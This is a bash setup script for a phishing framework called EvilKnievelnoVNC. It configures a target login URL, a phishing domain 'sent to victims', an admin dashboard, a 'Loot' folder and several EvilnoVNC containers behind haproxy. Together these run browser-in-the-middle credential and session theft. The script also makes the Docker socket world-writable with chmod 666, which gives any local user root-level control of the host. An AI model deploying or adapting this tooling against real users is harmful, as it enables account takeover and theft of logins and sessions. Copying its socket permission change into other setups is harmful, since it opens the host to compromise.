#!/bin/bash
# setup script for EvilKnievelnoVNC
# cleanup generated and collected data via ./setup.sh clean

###############################################################
## CONFIGURATION

# define number of concurrent EvilnoVNC instances
instances=4

# define admin interface credentials, change the password!
# username is ekadmin
adminPass="CHANGEME!"

# define target URL where victims effectively log in to
tUrl="https://target.domain/login"

# define URL of your server (fake URL sent to victims)
# no ending slash! e.g. https://example.com
sUrl="https://phishing.domain"

# define TCP port for administrative access
adminPort=1300

# define path to TLS cert+key
# combined cert+key in single pem, ./ means in haproxy/
cert="./certandkey.pem"
#cert="/etc/letsencrypt/live/yourDomain/certandkey.pem"

# if timezone is different than Europe/Berlin, grep/sed through the files and adjust to your needs ;)
# adjust error messages, e.g. haproxy/503.http


## optional/internal settings
# define custom port for victims, e.g. for testing, sUrl will be adjusted accordingly
victimPort=443

aUrl="$sUrl:$adminPort/"

[ ! $victimPort -eq 443 ] && sUrl="$sUrl:$victimPort/" || sUrl="$sUrl/"

accessToken=$(mktemp -u | cut -d"." -f2)
cookieKey=$(mktemp -u | cut -d"." -f2)

run="run.sh"
erun="EvilnoVNC/run.sh"
cfg="haproxy/haproxy.cfg"
hrun="haproxy/run.sh"
dash1="controller/src/phishboard/index.php"
dash2="controller/src/phishboard/interact.php"


###############################################################
## CLEANUP

# usage: ./setup clean
if [ $# -gt 0 ] && [ $1 = "clean" ]; then
	echo "[*] Cleaning up..."
	rm -f $run && echo ./$run
	rm -f $erun && echo $erun
	rm -f $cfg && echo $cfg
	rm -f $hrun && echo $hrun
	rm -f $dash1 && echo $dash1
	rm -f $dash2 && echo $dash2
	true > accesslog.txt && echo "accesslog.txt"
	true > submitlog.txt && echo "submitlog.txt"
	true > haproxy/whitelist.acl && echo "whitelist.acl"
	true > haproxy/blacklist.acl && echo "blacklist.acl"
	true > targets.json && echo "targets.json"
	rm -rf Loot/* && echo "Loot/*"
	rm -rf EvilnoVNC/tmp/* && echo "EvilnoVNC/tmp/*"
	rm -rf EvilnoVNC/tmp/.*
	echo "[*] Done"
	exit
fi


###############################################################
## SETUP

## check for dependencies
command -v docker   >/dev/null || { echo "[!] docker missing as dependency, exiting"; exit 1; }
command -v realpath >/dev/null || { echo "[!] realpath missing as dependency, exiting"; exit 1; }
command -v bash	    >/dev/null || { echo "[!] bash missing as dependency, exiting"; exit 1; }

## prepare Loot dir
mkdir -p Loot
chmod 777 Loot

## set permissions
chmod a+w *log.txt targets.json haproxy/*list.acl

## build run.sh from template
cp run-template.sh $run
chmod +x $run
sed -i "s#---tUrl---#$tUrl#" $run
sed -i "s/---inst---/$instances/" $run

## build EvilnoVNC run.sh from template
cp EvilnoVNC/run-template.sh $erun
chmod +x $erun
sed -i "s#---tUrl---#$tUrl#" $erun

## build haproxy config from template
cp haproxy/haproxy-template.cfg $cfg
sed -i "s/---adminPass---/$adminPass/" $cfg
sed -i "s/---accessToken---/$accessToken/" $cfg
sed -i "s/---cookieKey---/$cookieKey/" $cfg

## build haproxy run script
cp haproxy/run-template.sh $hrun
chmod +x $hrun
sed -i "s/---victimPort---/$victimPort/" $hrun
sed -i "s/---adminPort---/$adminPort/" $hrun
sed -i "s#---certandkey---#$cert#" $hrun

## build phishboard/index.php
cp controller/src/phishboard/index.template $dash1
sed -i "s#---aUrl---#$aUrl#" $dash1

## build pishboard/interact.php
cp controller/src/phishboard/interact.template $dash2
sed -i "s#---sUrl---#$sUrl#" $dash2
sed -i "s/---accessToken---/$accessToken/" $dash2

## add instance entries to haproxy.cfg
# add backend entries
nl=$'\n'
for i in $(seq $instances -1 1)
#for i in {$instances..1..1}
do
	[[ $i -lt 10 ]] && i="0$i"
	sed -i "84i\\\t" $cfg
	b="\\\tserver s$i evil$i:8111 cookie s$i"
	sed -i "84i$b" $cfg
	b="\\\tdefault-server check init-addr libc,none resolvers res on-marked-down shutdown-sessions"
	sed -i "84i$b" $cfg
	b="\\\tcookie _haad insert indirect nocache"
	sed -i "84i$b" $cfg
	b="backend b$i"
	sed -i "84i$b" $cfg
done

# add backend novnc entries
for i in $(seq $instances -1 1)
do
	[[ $i -lt 10 ]] && i="0$i"
	b="\\\tserver s$i evil$i:8111"
	sed -i "77i$b" $cfg
done

# add backend rules per instance
for i in $(seq $instances -1 1)
#for i in {$instances..1..1}
do
	[[ $i -lt 10 ]] && i="0$i"
	b="\\\tuse_backend b$i if { cook(_haad) s$i } !{ path_beg /phishboard }"
	sed -i "63i$b" $cfg
	b="\\\tuse_backend b$i if is_admin { urlp(svr) $i }"
	sed -i "63i$b" $cfg
done

# create docker internal network
sudo docker network create evil

# for controller to control EvilnoVNC containers
perm=$(stat -L -c "%a" /var/run/docker.sock)
[ ! $perm = "666" ] && sudo chmod 666 /var/run/docker.sock

echo "[*] If there were no errors, you are ready to go! --> ./run.sh"
exit

###############################################################
###############################################################
